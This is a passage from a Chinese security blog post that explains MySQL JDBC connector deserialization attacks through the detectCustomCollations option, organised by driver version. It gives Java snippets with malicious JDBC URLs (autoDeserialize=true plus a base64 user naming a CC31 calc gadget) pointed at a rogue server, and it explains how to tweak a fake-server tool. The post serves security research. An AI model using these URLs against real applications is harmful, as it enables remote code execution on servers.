+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808163939-2tle5v8.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>又发现了熟悉的resultSetToMap了，但是前面我们还不能高兴的太早，依然是检查我们JDBC连接启动项中detectCustomCollations是否为true，为true才会进入后续的反序列化操作。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808165150-niu504y.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>‍</p>
+<h3 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h3><p>detectCustomCollations的利用在于版本的限制比较多</p>
+<h4 id="6-0-2-6-0-6-1"><a href="#6-0-2-6-0-6-1" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h4><p>没什么限制的一段版本，直接打就行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String Driver=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">Class.forName(Driver);</span><br><span class="line"><span class="comment">//连接的访问路径</span></span><br><span class="line">String url=<span class="string">&quot;jdbc:mysql://127.0.0.1:24730/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>;</span><br><span class="line"><span class="comment">//进行连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">Statement statement=conn.createStatement();</span><br><span class="line">ResultSet rs=statement.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">    System.out.println(rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot; : &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h4><p>这个版本段也是可以打的，但是问题是他只会对结果集种的第三行数据进行getObject的反序列化操作</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808174635-blin04r.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808174351-utgwpkn.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p> 需要我们小改一下工具,许少之前已经写的差不多了，最后gadget写序列化数据的时候，3段行结果中，第三段是222的字节信息，转化过后是 <code>03 32 32 32</code>​，也就是222的16进制形式和其长度。这里我们为了兼容5.1.41-5.1.48的状况，只需要将结果集中第三行的数据改成data就行，这里的data就是序列化的payload</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808203728-79hrtvx.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>修改如下,重新打个jar包运行或者直接源码启动都可以。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240808203922-xt6zhmt.png" referrerpolicy="no-referrer" alt="image">​</p>
+<h4 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29-5.1.40"></a>5.1.29-5.1.40</h4><p>很奇怪的版本划分，只有5.1.41部分是将返回结果集的第三列数据进行反序列化操作，其他版本都是全部采用反序列化，跟6.0.2-6.0.6没有区别</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String Driver=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">       Class.forName(Driver);</span><br><span class="line">       <span class="comment">//连接的访问路径</span></span><br><span class="line">       String url=<span class="string">&quot;jdbc:mysql://127.0.0.1:24730/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>;</span><br><span class="line">       <span class="comment">//进行连接</span></span><br><span class="line">       <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;base64ZGVzZXJfQ0MzMV9jYWxj&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">       Statement statement=conn.createStatement();</span><br><span class="line">       ResultSet rs=statement.executeQuery(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">       <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">           System.out.println(rs.getString(<span class="string">&quot;username&quot;</span>)+<span class="string">&quot; : &quot;</span>+rs.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h4><p>在这个版本区间中就不会检查<code>detectCustomCollations=true</code>​的选项了，但是有个最低版本限制，这肯定能过，因为最低版本限制为5.0.0，所以之前的payload甚至都不用改，只是需要加上<code>autoDeserialize</code>​的选项即可。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240809092922-g1swa8x.png" referrerpolicy="no-referrer" alt="image">​</p>
+<p>其他版本，8往上，以及5.1.19往下，由于buildCollationMapping方法中不再调用resultSetToMap方法，所以不再存在利用途径。</p>
+<p><img src="https://b3logfile.com/siyuan/1722953976143/assets/image-20240809100653-g4o2s96.png" referrerpolicy="no-referrer" alt="image">​</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-08-09 18:22:17
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/JDBC/" title="JDBC">
+                        #JDBC
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Mysql-JDBC反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE"><span class="toc-text">JDBC基础回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ServerStatusDiffInterceptor"><span class="toc-text">ServerStatusDiffInterceptor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E6%8E%A2%E7%B4%A2"><span class="toc-text">漏洞点探索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="toc-text">伪造通信流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">利用总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-0-7-8-0-20"><span class="toc-text">8.0.7-8.0.20</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-0-2-6-0-6"><span class="toc-text">6.0.2-6.0.6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-11-5-1x%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC"><span class="toc-text">5.1.11-5.1x后续版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-0-5-1-10"><span class="toc-text">5.1.0-5.1.10</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#detectCustomCollations"><span class="toc-text">detectCustomCollations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90"><span class="toc-text">漏洞流程解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93-1"><span class="toc-text">利用总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-0-2-6-0-6-1"><span class="toc-text">6.0.2-6.0.6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-41-5-1-48"><span class="toc-text">5.1.41-5.1.48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-29-5-1-40"><span class="toc-text">5.1.29-5.1.40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-19-5-1-28"><span class="toc-text">5.1.19-5.1.28</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: [''],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2024 Oranges
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + JDBC-Mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2FJDBC%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
